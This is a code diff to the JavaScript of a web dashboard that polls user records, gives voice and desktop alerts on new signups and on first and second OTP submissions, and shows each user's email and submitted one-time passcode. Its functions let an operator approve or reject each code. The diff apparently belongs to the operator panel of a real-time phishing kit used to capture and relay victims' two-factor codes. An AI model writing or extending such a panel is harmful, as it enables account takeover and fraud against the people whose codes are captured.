+      // NEW SIGNUP - Voice says "New signup"
+      const newUsers = users.filter(u => 
+        !u.approved && !previousUsers.find(p => p.email === u.email)
+      );
+      
+      newUsers.forEach(user => {
+        speakText('New signup', true);
+        showBubble('📧 New signup', 'statPendingEmail');
+        showNotification('New Signup', `${user.email} signed up`, 'signup');
+      });
+      
+      // NEW FIRST OTP - Voice says "OTP received"
+      const newFirstOTPs = users.filter(u => 
+        u.approved && u.otp && !u.otp1_correct && 
+        !previousUsers.find(p => p.email === u.email && p.otp === u.otp)
+      );
+      
+      newFirstOTPs.forEach(user => {
+        speakText('OTP received', true);
+        showBubble('🔐 OTP received', 'statPendingFirst');
+        showNotification('First OTP', `${user.email} submitted OTP: ${user.otp}`, 'first-otp');
+      });
+      
+      // NEW SECOND OTP - Voice says "OTP received"
+      const newSecondOTPs = users.filter(u => 
+        u.otp1_correct && u.second_otp && !u.otp2_correct &&
+        !previousUsers.find(p => p.email === u.email && p.second_otp === u.second_otp)
+      );
+      
+      newSecondOTPs.forEach(user => {
+        speakText('OTP received', true);
+        showBubble('🔒 Second OTP', 'statPendingSecond');
+        showNotification('Second OTP', `${user.email} submitted second OTP`, 'second-otp');
+      });
+    }
+    
+    previousUsers = JSON.parse(JSON.stringify(users));
+    isFirstLoad = false;
+    
+  } catch(e) { 
+    console.error('Event check error:', e); 
+  }
+}
+
+// ==================== INITIALIZATION ====================
+window.approveEmail = approveEmail;
+window.approveFirstOTP = approveFirstOTP;
+window.approveSecondOTP = approveSecondOTP;
+window.incorrectFirstOTP = incorrectFirstOTP;
+window.incorrectSecondOTP = incorrectSecondOTP;
+window.deleteUser = deleteUser;
+window.copyToClipboard = copyToClipboard;
+window.testVoice = testVoice;
+window.toggleTTS = toggleTTS;
+window.logout = logout;
+
+if (Notification.permission === 'default') {
+  Notification.requestPermission();
+}
+
+document.getElementById('testVoiceBtn')?.addEventListener('click', testVoice);
+document.getElementById('ttsToggleBtn')?.addEventListener('click', toggleTTS);
+document.getElementById('themeToggleBtn')?.addEventListener('click', toggleTheme);
+document.getElementById('logoutBtn')?.addEventListener('click', logout);
+
+loadVoices().then(() => {
+  speakText('Ready', true);
+});
+
+loadUsers();
+setInterval(loadUsers, 3000);
+setInterval(checkForNewEvents, 4000);
 </script>
 
-<style>
-  .dark-mode {
-    background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
-  }
-  .dark-mode .glass-navbar,
-  .dark-mode .stat-card,
-  .dark-mode .table-container {
-    background: rgba(0, 0, 0, 0.3);
-  }
-</style>
 </body>
 </html>
